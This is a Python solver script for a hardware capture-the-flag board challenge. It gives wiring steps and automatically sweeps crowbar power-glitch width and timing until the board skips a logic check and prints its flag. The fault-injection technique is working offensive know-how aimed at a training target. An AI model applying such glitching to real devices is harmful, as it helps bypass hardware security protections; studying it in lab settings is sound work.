#!/usr/bin/env python3
"""
Curious Bolt CTF - Challenge 2: Boolean Glitching

Use power glitching to bypass an always-true condition.

The target code checks a condition that's always true, but by glitching
the power rail at the right moment, we can cause the CPU to skip the check
or evaluate it incorrectly.
"""

import sys
import serial
import time
from scope import Scope

print("""
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║  Curious Bolt CTF - Challenge 2: Boolean Glitching                  ║
║                                                                      ║
║  Objective: Use power glitching to bypass logic checks              ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
""")

print("\n" + "="*70)
print("WIRING INSTRUCTIONS")
print("="*70)

print("""
For Power Glitching:
────────────────────────────────────────────────────────────

Curious Bolt         →    Bolt CTF
─────────────────────────────────────────────────────────────
GLITCH_OUT (crowbar) →    VCC (power rail) ⚠️ Insert in series!
GND                  →    GND
TRIGGER (optional)   →    GPIO for timing

Bus Pirate (for monitoring):
────────────────────────────
PSU (3.3V)           →    Bolt CTF VCC (for monitoring current)
GND                  →    Bolt CTF GND

Serial Monitor:
───────────────
Connect to /dev/cu.usbserial-110 to watch for flag output

Note: The Curious Bolt's GLITCH_OUT needs to be inserted BETWEEN
      the power source and the target's VCC line. This allows it
      to briefly pull the voltage to ground (crowbar glitch).
""")

input("\nPress Enter when wiring is complete...")

print("\n" + "="*70)
print("STEP 1: START CHALLENGE 2")
print("="*70)

print("\nOn your Bolt CTF board:")
print("  Press button 2 (Challenge 2)")
print("\nThe device will run the vulnerable code in a loop.")

input("Press Enter after starting challenge 2...")

print("\n" + "="*70)
print("STEP 2: CONNECT TO DEVICES")
print("="*70)

# Connect to Curious Bolt
print("\n[1] Connecting to Curious Bolt...")
try:
    s = Scope()
    print(f"    ✅ Connected (version {s.con.version if hasattr(s.con, 'version') else 'unknown'})")
except Exception as e:
    print(f"    ❌ Failed: {e}")
    sys.exit(1)

# Connect to serial monitor
print("\n[2] Connecting to Bolt CTF serial...")
try:
    ser = serial.Serial('/dev/cu.usbserial-110', 115200, timeout=0.1)
    print("    ✅ Connected")
except Exception as e:
    print(f"    ❌ Failed: {e}")
    print("    Continuing anyway (you can monitor manually)")
    ser = None

print("\n" + "="*70)
print("STEP 3: CONFIGURE GLITCH PARAMETERS")
print("="*70)

print("""
Glitch parameters:
  - repeat: Width of glitch in clock cycles (8.3ns per cycle)
  - ext_offset: Delay after trigger in clock cycles

Starting parameters:
  - repeat: 60 cycles (~498ns)
  - ext_offset: 0 cycles
""")

# Initial configuration
s.glitch.repeat = 60
s.glitch.ext_offset = 0

print("✅ Initial configuration set")

print("\n" + "="*70)
print("STEP 4: MANUAL GLITCHING TEST")
print("="*70)

print("\nTesting single glitch...")
print("Triggering in 3...")
time.sleep(1)
print("2...")
time.sleep(1)
print("1...")
time.sleep(1)

s.trigger()
print("✅ Glitch triggered!")

time.sleep(0.5)

# Check for output
if ser and ser.in_waiting:
    data = ser.read(ser.in_waiting).decode('ascii', errors='ignore')
    print(f"\nSerial output: {data}")
    if 'ctf' in data.lower() or 'flag' in data.lower():
        print("\n🎉 SUCCESS! Flag found on first try!")
    else:
        print("\n⚠️  No flag yet. Need to sweep parameters.")
else:
    print("\n⚠️  No serial output detected")

print("\n" + "="*70)
print("STEP 5: AUTOMATED PARAMETER SWEEP")
print("="*70)

print("""
Now we'll automatically sweep glitch parameters to find the right timing.

Sweep ranges:
  - Width (repeat): 10 to 200 cycles, step 5
  - Offset: 0 to 500 cycles, step 10

This will try ~2000 combinations. Watch the serial output!
""")

response = input("\nStart automated sweep? (y/n): ").strip().lower()

if response == 'y':
    print("\n🔄 Starting parameter sweep...")
    print("(Press Ctrl+C to stop)")

    success = False
    attempts = 0
    start_time = time.time()

    try:
        for repeat in range(10, 200, 5):
            if success:
                break

            for offset in range(0, 500, 10):
                attempts += 1

                # Configure
                s.glitch.repeat = repeat
                s.glitch.ext_offset = offset

                # Trigger glitch
                s.trigger()
                time.sleep(0.05)

                # Check serial output
                if ser and ser.in_waiting:
                    data = ser.read(ser.in_waiting).decode('ascii', errors='ignore')

                    if 'ctf' in data.lower() or 'flag' in data.lower():
                        elapsed = time.time() - start_time
                        print(f"\n{'='*70}")
                        print("🎉 SUCCESS!")
                        print(f"{'='*70}")
                        print(f"Winning parameters:")
                        print(f"  repeat: {repeat} cycles ({repeat * 8.3:.1f}ns)")
                        print(f"  offset: {offset} cycles ({offset * 8.3:.1f}ns)")
                        print(f"  attempts: {attempts}")
                        print(f"  time: {elapsed:.1f}s")
                        print(f"\nFlag output:")
                        print(data)
                        print("="*70)
                        success = True
                        break

                # Progress indicator
                if attempts % 50 == 0:
                    print(f"  [{attempts:4d}] repeat={repeat:3d}, offset={offset:3d}", end='\r')

    except KeyboardInterrupt:
        print(f"\n\n⚠️  Sweep stopped by user after {attempts} attempts")

    if not success:
        print(f"\n⚠️  No success after {attempts} attempts")
        print("\nTroubleshooting:")
        print("  - Check wiring (GLITCH_OUT to VCC)")
        print("  - Try holding button 2 during glitching")
        print("  - Adjust sweep ranges")
        print("  - Monitor with oscilloscope to verify glitches")

else:
    print("\n⏭️  Skipping automated sweep")
    print("\nManual glitching:")
    print("  from scope import Scope")
    print("  s = Scope()")
    print("  s.glitch.repeat = 60")
    print("  s.glitch.ext_offset = 0")
    print("  s.trigger()  # Trigger glitch")

# Cleanup
if ser:
    ser.close()

print("\n" + "="*70)
print("CHALLENGE 2 COMPLETE!")
print("="*70)

if success:
    print("""
Congratulations! 🎉

You've successfully used power glitching to bypass a boolean check!

Next: Challenge 3 (I2C corruption) - even more advanced
""")
else:
    print("""
Keep trying! Power glitching requires patience and parameter tuning.

Tips:
  - Hold challenge button during glitching
  - Try different offset ranges
  - Monitor power rail with oscilloscope
  - Check that glitch pulses are visible
""")
